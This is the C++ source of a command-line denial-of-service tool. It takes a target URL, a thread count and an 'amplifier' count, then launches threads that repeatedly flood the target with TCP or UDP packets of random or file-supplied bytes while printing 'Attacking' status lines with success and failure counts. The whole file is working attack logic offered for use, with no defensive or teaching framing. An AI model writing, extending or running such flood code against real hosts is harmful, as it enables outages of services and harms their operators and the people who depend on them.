#include "network.hpp"
#include "color.hpp"

#include <getopt.h>
#include <sys/stat.h>
#include <cstring>
#include <csignal>

#define MAX_BUFFER 2048ul

#define HELP COLOR_RESET "Usage: " COLOR_MAGENTA "\"%s\"" COLOR_RESET " -m " COLOR_BLUE "<method>" COLOR_RESET " -t " COLOR_BLUE "<target>" \
             COLOR_RESET " -T " COLOR_BLUE "<threads>" COLOR_RESET " -a " COLOR_BLUE "<amplifier>" COLOR_RESET " " COLOR_CYAN "[OPTIONS]" COLOR_RESET\
             "\n" COLOR_RESET COLOR_YELLOW                                                                                                  \
             "Options:\n"                                                                                                                   \
             " --method|-m    <method>    ddos method\n"                                                                                    \
             " --target|-t    <target>    target url\n"                                                                                     \
             " --threads|-T   <threads>   threads count\n"                                                                                  \
             " --amplifier|-a <amplifier> in-thread requests count\n"                                                                       \
             " --data|-d      <file>      send data from file\n"                                                                            \
             " --debug|-D                 toggle debug printing" COLOR_RESET "\n"


static const char* appname;
static const char* send_data = nullptr;
static int running_threads = 0;
static int sent_requests = 0;
static int failed_requests = 0;
static size_t amplifier = 0;
static std::string method;
static bool debug = false;

static constexpr const char* s_options = "m:t:T:a:d:D";
const option l_options[]{
		{"method",    required_argument, nullptr, 'm'},
		{"target",    required_argument, nullptr, 't'},
		{"threads",   required_argument, nullptr, 'T'},
		{"amplifier", required_argument, nullptr, 'a'},
		{"data",      required_argument, nullptr, 'd'},
		{"debug",     no_argument,       nullptr, 'D'},
//		{"proxies",   required_argument, nullptr, 'p'},
		{nullptr}
};


char* rand_bytes(size_t size)
{
	char* data = new char[size];
	--size;
	for (size_t i = 0; i < size; ++i)
		data[i] = ::random() % (INT8_MAX - 1) + 1;
	data[size] = 0;
	return data;
}

void* flood_thread(void* arg)
{
	::srandom(::time(nullptr));
	auto address = *static_cast<net::inet_address*>(arg);
	for (size_t i = 0; i < amplifier; ++i)
	{
		if (method == "UDP" || method == "udp")
		{
			method = "UDP";
			net::udp_flood flood(address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), debug);
			if (flood)
				++sent_requests;
			else
				++failed_requests;
		}
		else // tcp
		{
			method = "TCP";
			net::tcp_flood flood(address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), debug);
			if (flood)
				++sent_requests;
			else
				++failed_requests;
		}
	}
	--running_threads;
	return nullptr;
}

int main(int argc, char** argv)
{
	appname = argv[0];
	
	net::inet_address* address = nullptr;
	int longid;
	int opt;
	size_t threads_count = 0;
	std::string data_file;
	
	while ((opt = ::getopt_long(argc, argv, s_options, l_options, &longid)) >= 0)
	{
		switch (opt)
		{
			case 'm':
			{
				method = std::string(optarg);
				for (char& i: method) i = std::tolower(i);
				break;
			}
			
			case 't':
			{
				auto addr_str = std::string(optarg);
				for (char& i: addr_str) i = std::tolower(i);
				address = new net::inet_address(addr_str);
				break;
			}
			
			case 'T':
			{
				threads_count = ::strtoul(optarg, nullptr, 10);
				break;
			}
			
			case 'a':
			{
				amplifier = ::strtoul(optarg, nullptr, 10);
				break;
			}
			
			case 'd':
			{
				data_file = std::string(optarg);
				break;
			}
			
			case 'D':
			{
				debug = true;
				break;
			}
			
			default: // '?'
			{
				::printf(HELP, appname);
				::exit(0);
			}
		}
	}
	
	if (debug)
		std::cout << COLOR_YELLOW COLOR_FAINT << "threads_count = " << threads_count << " amplifier = " << amplifier << COLOR_RESET "\n";
	
	if (!method.empty() && address && threads_count && amplifier)
	{
		char* data = nullptr;
		if (!data_file.empty())
		{
			struct stat st{ };
			::stat(data_file.c_str(), &st);
			FILE* file = ::fopen(data_file.c_str(), "rb");
			if (file)
			{
				if (st.st_size < MAX_BUFFER)
				{
					data = new char[st.st_size + 1];
					size_t read = ::fread(data, sizeof(char), st.st_size, file);
					data[read] = 0;
				}
				else
				{
					::fprintf(
							stderr,
							COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't allocate buffer of size = %lu. Maximum size is %lu." COLOR_RESET,
							st.st_size, MAX_BUFFER
					);
					::exit(-1);
				}
			}
			else
			{
				::fprintf(
						stderr,
						COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't open file \"%s\" : %s - %s" COLOR_RESET,
						data_file.c_str(), ::strerrorname_np(errno), ::strerrordesc_np(errno)
				);
				::exit(errno);
			}
		}
		
		send_data = data;
		
		::srandom(::clock());
		
		for (size_t i = 0; i < threads_count; ++i)
		{
			++running_threads;
			pthread_t thread;
			::pthread_create(&thread, nullptr, flood_thread, address);
			::pthread_detach(thread);
		}
		
		while (running_threads > 0)
		{
			::printf(
					COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA
					"%s" COLOR_RESET " | successes " COLOR_GREEN "%d" COLOR_RESET " | fails " COLOR_RED "%d" COLOR_RESET " | running threads %d\n",
					address->get_ip().c_str(), address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
			);
			::sleep(1);
			::srandom(::clock());
		}
		::exit(0);
	}
	::printf(HELP, appname);
	::exit(-2);
}
